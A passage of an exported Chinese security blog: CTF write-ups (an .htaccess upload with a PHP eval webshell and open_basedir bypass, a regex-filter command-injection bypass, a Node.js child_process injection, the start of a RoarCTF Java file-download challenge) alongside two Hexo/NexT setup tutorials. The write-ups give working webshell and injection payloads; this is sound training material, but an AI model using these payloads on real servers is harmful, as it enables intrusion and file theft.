class="built_in">write</span>(b<span class="string">'AddType application/x-httpd-php .lethe\n'</span><span class="comment">)//将.lethe后缀的文件作为php解析</span></span><br><span class="line">htaccess.<span class="built_in">write</span>(b<span class="string">'php_value zend.multibyte 1\n'</span>)</span><br><span class="line">htaccess.<span class="built_in">write</span>(b<span class="string">'php_value zend.detect_unicode 1\n'</span>)</span><br><span class="line">htaccess.<span class="built_in">write</span>(b<span class="string">'php_value display_errors 1\n'</span>)</span><br><span class="line"></span><br><span class="line">htaccess.<span class="built_in">close</span>()</span><br><span class="line"></span><br><span class="line">generate_htacess()</span><br><span class="line">generate_php_file(<span class="string">"shell.lethe"</span>, <span class="string">"&lt;?php eval($_GET['cmd']); die(); ?&gt;"</span>)</span><br></pre></td></tr></table></figure><hr><p>然后使用postman上传.htaccess</p><p><img src="/2.jpg"></p><p>虽然上传了马，但是要绕过<b>open_basedir(限制访问的)，具体看笔记</b></p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">open_basedir是php.ini中的一个配置选项</span><br><span class="line">它可将用户访问文件的活动范围限制在指定的区域，</span><br><span class="line">假设open_basedir=<span class="meta-keyword">/home/</span>wwwroot<span class="meta-keyword">/home/</span>web1/:<span class="meta-keyword">/tmp/</span>，</span><br><span class="line">那么通过web1访问服务器的用户就无法获取服务器上除了<span class="meta-keyword">/home/</span>wwwroot<span class="meta-keyword">/home/</span>web1/和<span class="meta-keyword">/tmp/</span>这两个目录以外的文件。</span><br><span class="line">注意用open_basedir指定的限制实际上是前缀,而不是目录名。</span><br><span class="line">举例来说: 若<span class="string">"open_basedir = /dir/user"</span>, 那么目录 <span class="string">"/dir/user"</span> 和 <span class="string">"/dir/user1"</span>都是可以访问的。</span><br><span class="line">所以如果要将访问限制在仅为指定的目录，请用斜线结束路径名。</span><br></pre></td></tr></table></figure><p>payload:<br></p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=<span class="keyword">chdir</span>(%27img%27);ini_set(%27open_basedir%27,%27..%27);<span class="keyword">chdir</span>(%27..%27);<span class="keyword">chdir</span>(%27..%27);<span class="keyword">chdir</span>(%27..%27);<span class="keyword">chdir</span>(%27..%27);ini_set(%27open_basedir%27,%27/%27);print_r(scandir(%27/%27));</span><br></pre></td></tr></table></figure><p><img src="/3.jpg"></p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="keyword">cmd</span><span class="bash">=<span class="built_in">chdir</span>(<span class="string">'/tmp'</span>);mkdir(<span class="string">'lethe'</span>);<span class="built_in">chdir</span>(<span class="string">'lethe'</span>);ini_set(<span class="string">'open_basedir'</span>,<span class="string">'..'</span>);<span class="built_in">chdir</span>(<span class="string">'..'</span>);<span class="built_in">chdir</span>(<span class="string">'..'</span>);<span class="built_in">chdir</span>(<span class="string">'..'</span>);<span class="built_in">chdir</span>(<span class="string">'..'</span>);ini_set(<span class="string">'open_basedir'</span>,<span class="string">'/'</span>);var_dump(ini_get(<span class="string">'open_basedir'</span>));var_dump(file_get_contents(THis_Is_tHe_F14g));</span></span><br></pre></td></tr></table></figure><p><img src="/4.jpg"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hexo-next搭建配置以及坑点(二)</title>
      <link href="/2019/12/01/hexo-next%E6%90%AD%E5%BB%BA%E9%85%8D%E7%BD%AE%E4%BB%A5%E5%8F%8A%E5%9D%91%E7%82%B9-%E4%BA%8C/"/>
      <url>/2019/12/01/hexo-next%E6%90%AD%E5%BB%BA%E9%85%8D%E7%BD%AE%E4%BB%A5%E5%8F%8A%E5%9D%91%E7%82%B9-%E4%BA%8C/</url>
      
        <content type="html"><![CDATA[<h3 id="要使用-git-工具首先要配置一下SSH-key，为部署本地博客到-Github-做准备。"><a href="#要使用-git-工具首先要配置一下SSH-key，为部署本地博客到-Github-做准备。" class="headerlink" title="要使用 git 工具首先要配置一下SSH key，为部署本地博客到 Github 做准备。"></a>要使用 git 工具首先要配置一下SSH key，为部署本地博客到 Github 做准备。</h3><a id="more"></a><p><b>以下博文仅限于windows平台配置,如有错误望谅解！</b><br></p><h1 id="配置-SSH-key"><a href="#配置-SSH-key" class="headerlink" title="配置 SSH key"></a>配置 SSH key</h1><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ git<span class="built_in"> config </span>--global user.name <span class="string">"用户名"</span></span><br><span class="line">$ git<span class="built_in"> config </span>--global user.email <span class="string">"邮箱地址"</span></span><br></pre></td></tr></table></figure><p>执行以上命令全局配置一下本地账户<br><br>生成密钥 SSH key :<br><br><code>ssh-keygen -t rsa -C &#39;上面的邮箱&#39;</code><br><br>三次回车生成ssh key，通过命令得到公钥<br><code>cat ~/.ssh/id_rsa.pub</code></p><h1 id="链接Github"><a href="#链接Github" class="headerlink" title="链接Github"></a>链接Github</h1><p><a href="https://github.com/" target="_blank" rel="noopener">Github</a><br><br>点击头像找到settings<br>然后选择SSH and GPG keys 这个选项<br><br><br>点击”New SSH key”这个按钮<br></p><img src="/2019/12/01/hexo-next%E6%90%AD%E5%BB%BA%E9%85%8D%E7%BD%AE%E4%BB%A5%E5%8F%8A%E5%9D%91%E7%82%B9-%E4%BA%8C/1.jpg" class=""><br>输入刚刚得到的密钥，确认连接上后，再命令框输入命令:<br>`ssh -T git@github.com`<br>会提示you've successfully 表示连接成功<p>然后进入站点根目录_config.yml</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">deploy</span>:</span><br><span class="line">  <span class="attribute">type</span>: git </span><br><span class="line">  <span class="attribute">repository</span>:  </span><br><span class="line">    git<span class="variable">@github</span>.<span class="attribute">com</span>:ChenZIDu/chenzidu.github.io.git   </span><br><span class="line">  <span class="attribute">branch</span>: master</span><br></pre></td></tr></table></figure><p>repository为自己项目的下载链接<br><br><br>要安装一个部署插件 hexo-deployer-git。</p><p><code>$ npm install hexo-deployer-git --save</code><br>之后每次更改 输入hexo g -d就可以进行远程部署了<br>之后浏览器访问:<code>你的名字.github.io</code>就可以进行访问<br>#</p><h2 id="关于博客引用图片解决方法"><a href="#关于博客引用图片解决方法" class="headerlink" title="关于博客引用图片解决方法"></a>关于博客引用图片解决方法</h2><p>下载官方一个插件：<br><br><code>$ npm install hexo-asset-image --save</code></p><p>之后打开站点根目录 搜索:post_asset_folder,将false改成true</p><img src="/2019/12/01/hexo-next%E6%90%AD%E5%BB%BA%E9%85%8D%E7%BD%AE%E4%BB%A5%E5%8F%8A%E5%9D%91%E7%82%B9-%E4%BA%8C/2.jpg" class=""><p>之后在每次写博客的同时$ hexo new “博客名字” 会自动生成一个与博客名字相同的文件夹,然后进行把图片放进去</p><p><code></code><br><br>这种方式调用就行了,但是要注意，要将网站根目录的url栏修改一下</p><img src="/2019/12/01/hexo-next%E6%90%AD%E5%BB%BA%E9%85%8D%E7%BD%AE%E4%BB%A5%E5%8F%8A%E5%9D%91%E7%82%B9-%E4%BA%8C/3.jpg" class=""><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># URL</span></span><br><span class="line"><span class="comment">## If your site is put in a subdirectory, set url as 'http://yoursite.com/child' and root as '/child/'</span></span><br><span class="line"><span class="symbol">url:</span> <span class="symbol">http:</span>/<span class="regexp">/github.com/</span>ChenZIDu</span><br><span class="line"><span class="symbol">root:</span> /</span><br><span class="line"><span class="symbol">permalink:</span> <span class="symbol">:year/</span><span class="symbol">:month/</span><span class="symbol">:day/</span><span class="symbol">:title/</span></span><br></pre></td></tr></table></figure><p>将url这边修改为自己的github地址，否则会寻找不到图片</p><h1 id=""><a href="#" class="headerlink" title=""></a></h1><h2 id="关于博客添加头像"><a href="#关于博客添加头像" class="headerlink" title="关于博客添加头像"></a>关于博客添加头像</h2><img src="/2019/12/01/hexo-next%E6%90%AD%E5%BB%BA%E9%85%8D%E7%BD%AE%E4%BB%A5%E5%8F%8A%E5%9D%91%E7%82%B9-%E4%BA%8C/4.jpg" class=""><p>将你想要的头像放入<b>next&#x2F;source&#x2F;images这个路径</b><br><br><code>url: /images/avatar.jpg</code></p><p>然后修改下url路径这个就行了</p><h2 id="关于博客背景图片"><a href="#关于博客背景图片" class="headerlink" title="关于博客背景图片"></a>关于博客背景图片</h2><h3 id="NexT主题v7-3-0版本将所有自定义custom文件转移至Hexo目录source-data-…中。"><a href="#NexT主题v7-3-0版本将所有自定义custom文件转移至Hexo目录source-data-…中。" class="headerlink" title="NexT主题v7.3.0版本将所有自定义custom文件转移至Hexo目录source&#x2F;_data&#x2F;…中。"></a>NexT主题v7.3.0版本将所有自定义custom文件转移至Hexo目录source&#x2F;_data&#x2F;…中。</h3><p>如果要使用其中的一些东西，在next主题根目录下将#去掉</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">custom_file_path:</span><br><span class="line">  #head: <span class="keyword">source</span><span class="regexp">/_data/</span>head.swig</span><br><span class="line">  #header: <span class="keyword">source</span><span class="regexp">/_data/</span>header.swig</span><br><span class="line">  #sidebar: <span class="keyword">source</span><span class="regexp">/_data/</span>sidebar.swig</span><br><span class="line">  #postMeta: <span class="keyword">source</span><span class="regexp">/_data/</span>post-meta.swig</span><br><span class="line">  #postBodyEnd: <span class="keyword">source</span><span class="regexp">/_data/</span>post-body-end.swig</span><br><span class="line">  #footer: <span class="keyword">source</span><span class="regexp">/_data/</span>footer.swig</span><br><span class="line">  #bodyEnd: <span class="keyword">source</span><span class="regexp">/_data/</span>body-end.swig</span><br><span class="line">  #variable: <span class="keyword">source</span><span class="regexp">/_data/</span>variables.styl</span><br><span class="line">  #mixin: <span class="keyword">source</span><span class="regexp">/_data/mi</span>xins.styl</span><br><span class="line">  style: <span class="keyword">source</span><span class="regexp">/_data/</span>styles.styl</span><br></pre></td></tr></table></figure><p>根据下文所需要改动的自定义文件取消引用对应内容，并在blog&#x2F;source&#x2F;_data&#x2F;…中添加改动内容。</p><img src="/2019/12/01/hexo-next%E6%90%AD%E5%BB%BA%E9%85%8D%E7%BD%AE%E4%BB%A5%E5%8F%8A%E5%9D%91%E7%82%B9-%E4%BA%8C/5.jpg" class=""><p>自己新建_data文件夹,里面在建styles.styl文件</p><p>背景图片为最后一个styles.styl</p><p><b>背景图片和头像图片放在同个文件夹内</b></p><p>我的styles.styl配置：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">body</span> &#123;</span><br><span class="line">  <span class="attribute">background-image</span>:<span class="built_in">url</span>(../images/background.jpg);</span><br><span class="line">  <span class="attribute">height</span>:<span class="number">100%</span>;</span><br><span class="line">  <span class="attribute">width</span>:<span class="number">100%</span>;</span><br><span class="line">  <span class="attribute">background-repeat</span>:repeat-x;</span><br><span class="line">  <span class="attribute">background-attachment</span>:fixed;</span><br><span class="line">  <span class="attribute">background-size</span>:<span class="number">100%</span> <span class="number">100%</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="-1"><a href="#-1" class="headerlink" title=""></a></h1><h2 id="搜索功能添加"><a href="#搜索功能添加" class="headerlink" title="搜索功能添加"></a>搜索功能添加</h2><p><b>安装插件</b><br><br><code>npm install hexo-generator-searchdb --save</code></p><p>打开站点配置文件找到 Extensions 在下面添加（其实，新增以下内容到任意位置即可）</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">search:</span></span><br><span class="line">      <span class="attr">path:</span> <span class="string">search.xml</span></span><br><span class="line">      <span class="attr">field:</span> <span class="string">post</span></span><br><span class="line">      <span class="attr">format:</span> <span class="string">html</span></span><br><span class="line">      <span class="attr">limit:</span> <span class="number">10000</span></span><br></pre></td></tr></table></figure><p>打开主题配置文件找到 Local search，将 enable 设置为 true，启动本地搜索功能，这样就能在页面可以看到搜索菜单了：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">local_search:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure><p>谢谢！有些细节网上内容比较多，不在阐述具体讲一些我在网上难以搜到的坑点。</p>]]></content>
      
      
      <categories>
          
          <category> blog </category>
          
      </categories>
      
      
        <tags>
            
            <tag> next </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hexo-next搭建配置以及坑点(一)</title>
      <link href="/2019/12/01/hexo-next%E6%90%AD%E5%BB%BA%E9%85%8D%E7%BD%AE%E4%BB%A5%E5%8F%8A%E5%9D%91%E7%82%B9(%E4%B8%80)/"/>
      <url>/2019/12/01/hexo-next%E6%90%AD%E5%BB%BA%E9%85%8D%E7%BD%AE%E4%BB%A5%E5%8F%8A%E5%9D%91%E7%82%B9(%E4%B8%80)/</url>
      
        <content type="html"><![CDATA[<h3 id="Hexo-是高效的静态站点生成框架，她基于-Node-js。-通过-Hexo-你可以轻松地使用-Markdown-编写文章，除了-Markdown-本身的语法之外，还可以使用-Hexo-提供的-标签插件-来快速的插入特定形式的内容。在这篇文章中，假定你已经成功安装了-Hexo，并使用-Hexo-提供的命令创建了一个站点。"><a href="#Hexo-是高效的静态站点生成框架，她基于-Node-js。-通过-Hexo-你可以轻松地使用-Markdown-编写文章，除了-Markdown-本身的语法之外，还可以使用-Hexo-提供的-标签插件-来快速的插入特定形式的内容。在这篇文章中，假定你已经成功安装了-Hexo，并使用-Hexo-提供的命令创建了一个站点。" class="headerlink" title="Hexo 是高效的静态站点生成框架，她基于 Node.js。 通过 Hexo 你可以轻松地使用 Markdown 编写文章，除了 Markdown 本身的语法之外，还可以使用 Hexo 提供的 标签插件 来快速的插入特定形式的内容。在这篇文章中，假定你已经成功安装了 Hexo，并使用 Hexo 提供的命令创建了一个站点。"></a>Hexo 是高效的静态站点生成框架，她基于 Node.js。 通过 Hexo 你可以轻松地使用 Markdown 编写文章，除了 Markdown 本身的语法之外，还可以使用 Hexo 提供的 标签插件 来快速的插入特定形式的内容。在这篇文章中，假定你已经成功安装了 Hexo，并使用 Hexo 提供的命令创建了一个站点。</h3><a id="more"></a><p><b>以下博文仅限于windows平台配置,如有错误望谅解！</b><br></p><h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><p>在 Hexo 中有两份主要的配置文件，其名称都是 _config.yml。 其中，一份位于站点根目录下，主要包含 Hexo 本身的配置；另一份位于主题目录下，这份配置由主题作者提供，主要用于配置主题相关的选项。</p><p><b> 为了描述方便，在以下说明中，将前者称为 站点配置文件， 后者称为 主题配置文件。<br></b><br>安装 Hexo 相当简单，只需要先安装下列应用程序即可：</p><p><a href="https://nodejs.org/en/" target="_blank" rel="noopener">Node.js</a> (Node.js 版本需不低于 8.6，建议使用 Node.js 10.0 及以上版本)</p><p><a href="https://git-scm.com/" target="_blank" rel="noopener">Git</a><br>#</p><h2 id="安装-Hexo"><a href="#安装-Hexo" class="headerlink" title="安装 Hexo"></a>安装 Hexo</h2><p>所有必备的应用程序安装完成后，即可使用 npm 安装 Hexo。<br><code>$ npm install -g hexo-cli </code><br><br>再hexo文件夹下打开git<br><br><code>$ hexo init blog</code><br><code>$ cd blog</code><br><code>$ hexo g</code>  打包生成<br><code>$ hexo s</code>  本地搭建</p><p>然后成功后你可以通过访问来看博客(ctrl+c进行退出):<br><br><code>localhost:4000</code><br><br></p><img src="/2019/12/01/hexo-next%E6%90%AD%E5%BB%BA%E9%85%8D%E7%BD%AE%E4%BB%A5%E5%8F%8A%E5%9D%91%E7%82%B9(%E4%B8%80)/1.jpg" class=""><h2 id="安装next"><a href="#安装next" class="headerlink" title="安装next"></a>安装next</h2><p><code>$ git clone https://github.com/iissnan/hexo-theme-next themes/next</code></p><p>打开站点配置文件_config.yml,查找theme 内容更改为next</p><img src="/2019/12/01/hexo-next%E6%90%AD%E5%BB%BA%E9%85%8D%E7%BD%AE%E4%BB%A5%E5%8F%8A%E5%9D%91%E7%82%B9(%E4%B8%80)/2.jpg" class=""><p>然后输入</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">$</span> hexo clean    <span class="comment">//清楚缓存</span></span><br><span class="line"><span class="symbol">$</span> hexo g       <span class="comment">//打包</span></span><br><span class="line"><span class="symbol">$</span> hexo s     <span class="comment">//部署本地</span></span><br></pre></td></tr></table></figure><p>通过链接进行访问:<br><br><code>localhost:4000</code><br>next一共有四个主题</p><figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># Schemes</span></span><br><span class="line"><span class="meta">#scheme: Muse</span></span><br><span class="line"><span class="meta">#scheme: Mist</span></span><br><span class="line"><span class="meta">#scheme: Pisces</span></span><br><span class="line">scheme: Gemini</span><br></pre></td></tr></table></figure><p>我用的是 Gemini主题<br><br>在主题配置文件中搜索<b>Schemes</b>进行配置</p><p>至此本地搭建已完成</p>]]></content>
      
      
      <categories>
          
          <category> blog </category>
          
      </categories>
      
      
        <tags>
            
            <tag> next </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2019UNCTF bypass</title>
      <link href="/2019/11/21/2019UNCTF-bypass/"/>
      <url>/2019/11/21/2019UNCTF-bypass/</url>
      
        <content type="html"><![CDATA[<h2 id="rce，正则匹配特点，文件通配符，命令换行，命令注释"><a href="#rce，正则匹配特点，文件通配符，命令换行，命令注释" class="headerlink" title="rce，正则匹配特点，文件通配符，命令换行，命令注释"></a>rce，正则匹配特点，文件通配符，命令换行，命令注释</h2><a id="more"></a><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">    <span class="keyword">$a = $_GET['a'];</span></span><br><span class="line"><span class="keyword">    $b = $_GET['b'];</span></span><br><span class="line"><span class="keyword"> // try bypass it</span></span><br><span class="line"><span class="keyword">    if </span>(preg_match("/<span class="symbol">\'</span>|<span class="symbol">\"</span>|,|;|<span class="symbol">\\</span>|<span class="symbol">\`</span>|<span class="symbol">\*</span>|<span class="symbol">\n</span>|<span class="symbol">\t</span>|<span class="symbol">\x</span>A0|<span class="symbol">\r</span>|<span class="symbol">\&#123;</span>|<span class="symbol">\&#125;</span>|<span class="symbol">\(</span>|<span class="symbol">\)</span>|&lt;|<span class="symbol">\&amp;</span>[^<span class="symbol">\d</span>]|@|<span class="symbol">\|</span>|tail|bin|less|more|string|nl|pwd|cat|sh|flag|find|ls|grep|echo|w/is", <span class="keyword">$a))</span></span><br><span class="line"><span class="keyword">        $a = "";</span></span><br><span class="line"><span class="keyword">        $a ='"' . $a . '"';</span></span><br><span class="line"><span class="keyword">    if </span>(preg_match("/<span class="symbol">\'</span>|<span class="symbol">\"</span>|;|,|<span class="symbol">\`</span>|<span class="symbol">\*</span>|<span class="symbol">\\</span>|<span class="symbol">\n</span>|<span class="symbol">\t</span>|<span class="symbol">\r</span>|<span class="symbol">\x</span>A0|<span class="symbol">\&#123;</span>|<span class="symbol">\&#125;</span>|<span class="symbol">\(</span>|<span class="symbol">\)</span>|&lt;|<span class="symbol">\&amp;</span>[^<span class="symbol">\d</span>]|@|<span class="symbol">\|</span>|tail|bin|less|more|string|nl|pwd|cat|sh|flag|find|ls|grep|echo|w/is", <span class="keyword">$b))</span></span><br><span class="line"><span class="keyword">        $b = "";</span></span><br><span class="line"><span class="keyword">        $b = '"' . $b . '"';</span></span><br><span class="line"><span class="keyword">     $cmd = "file $a $b";</span></span><br><span class="line"><span class="keyword">      str_replace</span>(" ","","<span class="keyword">$cmd"); </span></span><br><span class="line"><span class="keyword">     system</span>(<span class="keyword">$cmd);</span></span><br><span class="line"><span class="keyword">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="预期解"><a href="#预期解" class="headerlink" title="预期解"></a>预期解</h2><p>正则中有一段<br><br><code>\\|</code><br><br>会将|进行转义，这是因为在preg_match中，三个反斜杠\\才能匹配一个真正意义上的字符反斜杠\，所以这里因为正则的匹配机制造成了反引号逃逸。<br><br>传入a，b后会再前后加上双引号，所以我们可以利用 \ 给a后面的”进行转义，然后让前面的”匹配b前面的,然后利用%0a,来造成命令换行，利用#号来进行命令终结。<br><br>实质上还是因为正则\匹配不到\的问题再结合linux的命令终止符%20#处理双引号.<br><br><b>最终的payload为：</b><br><br><code>?a=\&amp;b=%0a/???/gr?p -r ctf %23     %23=&#39;#&#39; 或?a=\&amp;b=%0a/???/gr[d-f]p+-r+.+%23</code><br><br><b>我的思路是因为正则匹配禁用了bin，所以估计实在bin目录下</b></p><h2 id="非预期解"><a href="#非预期解" class="headerlink" title="非预期解"></a>非预期解</h2><p>这边正则没有过滤 ``反引号间的内容，会被shell先执行。其输出被放入主命令后，主命令再被执行。<br><br>dir列目录<br><br><code>?a=`dir%20/</code><br></p><img src="/2019/11/21/2019UNCTF-bypass/1.jpg" class=""><p>试试grep查找flag<br></p><p><code>?a=`/???/gr?p -r ctf</code><br></p><img src="/2019/11/21/2019UNCTF-bypass/2.jpg" class="">]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2019UNCTF checkin</title>
      <link href="/2019/11/20/2019UNCTF-checkin/"/>
      <url>/2019/11/20/2019UNCTF-checkin/</url>
      
        <content type="html"><![CDATA[<h3 id="Node-js是一个Javascript运行环境-runtime-environment-Node-js不是一个JavaScript框架-Node-js是一个让JavaScript运行在服务端的开发平台，它让JavaScript成为与PHP、Python、Perl、Ruby-等服务端语言平起平坐的脚本语言。"><a href="#Node-js是一个Javascript运行环境-runtime-environment-Node-js不是一个JavaScript框架-Node-js是一个让JavaScript运行在服务端的开发平台，它让JavaScript成为与PHP、Python、Perl、Ruby-等服务端语言平起平坐的脚本语言。" class="headerlink" title="Node.js是一个Javascript运行环境(runtime environment),Node.js不是一个JavaScript框架,Node.js是一个让JavaScript运行在服务端的开发平台，它让JavaScript成为与PHP、Python、Perl、Ruby 等服务端语言平起平坐的脚本语言。"></a>Node.js是一个Javascript运行环境(runtime environment),Node.js不是一个JavaScript框架,Node.js是一个让JavaScript运行在服务端的开发平台，它让JavaScript成为与PHP、Python、Perl、Ruby 等服务端语言平起平坐的脚本语言。</h3><a id="more"></a><p>进入之后是一个聊天室.<br>查看源码app.03bc1faf.js，这个JS文件里有&#x2F;help、&#x2F;more、&#x2F;calc、&#x2F;name、&#x2F;flag、&#x2F;clear</p><p>但是&#x2F;calc，输入&#x2F;help不提醒，而且可以进行运算。</p><img src="/2019/11/20/2019UNCTF-checkin/1.png" class=""><p>调用calc函数</p><p><code>/calc 5*6</code></p><img src="/2019/11/20/2019UNCTF-checkin/2.jpg" class=""><h1 id="nodejs注入"><a href="#nodejs注入" class="headerlink" title="nodejs注入"></a>nodejs注入</h1><h2 id="执行JavaScript命令"><a href="#执行JavaScript命令" class="headerlink" title="执行JavaScript命令"></a>执行JavaScript命令</h2><p><code>payload: ?input=console.log(&#39;hello&#39;)</code></p><p>运行rce.js，在浏览器中输入payload，可以看到控制台中输出了“hello”，说明我们的命令被成功执行了：<br>#</p><h2 id="使用fs模块读取文件"><a href="#使用fs模块读取文件" class="headerlink" title="使用fs模块读取文件"></a>使用fs模块读取文件</h2><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">rec</span>.js目录下放置了一个flag.txt。</span><br><span class="line"></span><br><span class="line">payload:?input=res.<span class="keyword">end</span>(require('fs').read<span class="constructor">FileSync('.<span class="operator">/</span><span class="params">flag</span>.<span class="params">txt</span>')</span>.<span class="keyword">to</span><span class="constructor">String()</span>)</span><br><span class="line"></span><br><span class="line">浏览器窗口中输出了flag.txt的内容：</span><br></pre></td></tr></table></figure><h1 id=""><a href="#" class="headerlink" title=""></a></h1><h2 id="使用child-process模块执行系统命令"><a href="#使用child-process模块执行系统命令" class="headerlink" title="使用child_process模块执行系统命令"></a>使用child_process模块执行系统命令</h2><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">payload:?<span class="built_in">input</span>=<span class="built_in">require</span>(<span class="string">'child_process'</span>).exec(<span class="string">'calc'</span>)</span><br><span class="line"></span><br><span class="line">成功弹出了计算器：</span><br><span class="line"></span><br><span class="line">payload:http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">8888</span>/?<span class="built_in">input</span>=<span class="built_in">require</span>(<span class="string">'child_process'</span>).exec(<span class="string">'mkdir test'</span>)</span><br><span class="line"></span><br><span class="line">成功创建了一个名叫“test”的目录：</span><br></pre></td></tr></table></figure><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>调用child_process模块执行命令，题目过滤了空格，用$IFS替代空格</p><p>IFS，Linux叫做内部字段分隔符<br>#</p><h3 id="模仿上面方法"><a href="#模仿上面方法" class="headerlink" title="模仿上面方法"></a>模仿上面方法</h3><p>payload:<br><code>/calc require(&quot;child_process&quot;).execSync(&quot;ls$IFS/&quot;).toString()</code></p><p>列出目录</p><img src="/2019/11/20/2019UNCTF-checkin/3.jpg" class=""><p>取flag</p><p><code>/calc require(&quot;child_process&quot;).execSync(&quot;cat$IFS/flag&quot;).toString()</code></p><img src="/2019/11/20/2019UNCTF-checkin/5.jpg" class="">]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> nodejs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[RoarCTF 2019]Easy Java</title>
      <link href="/2019/10/20/RoarCTF-2019-Easy-Java/"/>
      <url>/2019/10/20/RoarCTF-2019-Easy-Java/</url>
      
        <content type="html"><![CDATA[<h2 id="WEB-INF主要通过找到web-xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码"><a href="#WEB-INF主要通过找到web-xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码" class="headerlink" title="WEB-INF主要通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码"></a>WEB-INF主要通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码</h2><a id="more"></a><h4 id="https-buuoj-cn-challenges-RoarCTF-202019-Easy-20Java"><a href="#https-buuoj-cn-challenges-RoarCTF-202019-Easy-20Java" class="headerlink" title="https://buuoj.cn/challenges#[RoarCTF%202019]Easy%20Java"></a><a href="https://buuoj.cn/challenges#[RoarCTF%202019]Easy%20Java" target="_blank" rel="noopener">https://buuoj.cn/challenges#[RoarCTF%202019]Easy%20Java</a></h4><h3 id="首先看到一个页面-点击下help看看啥情况。"><a href="#首先看到一个页面-点击下help看看啥情况。" class="headerlink" title="首先看到一个页面,点击下help看看啥情况。"></a>首先看到一个页面,点击下help看看啥情况。</h3><p><img src="/1.jpg"></p><p>发现输出一串</p><p><code>java.io.FileNotFoundException:{help.docx}</code></p><p>可能是报错信息，打开Brup截取请求信息</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">GET</span> <span class="string">/Download?filename=help.docx</span> <span class="string">HTTP/1.1</span></span><br><span class="line"><span class="attr">Host:</span> <span class="string">a6360be7-edf9-4caa-9461-3f2c7a89df9e.node3.buuoj.cn</span></span><br><span class="line"><span class="attr">User-Agent:</span> <span class="string">Mozilla/5.0</span> <span class="string">(Windows</span> <span class="string">NT</span> <span 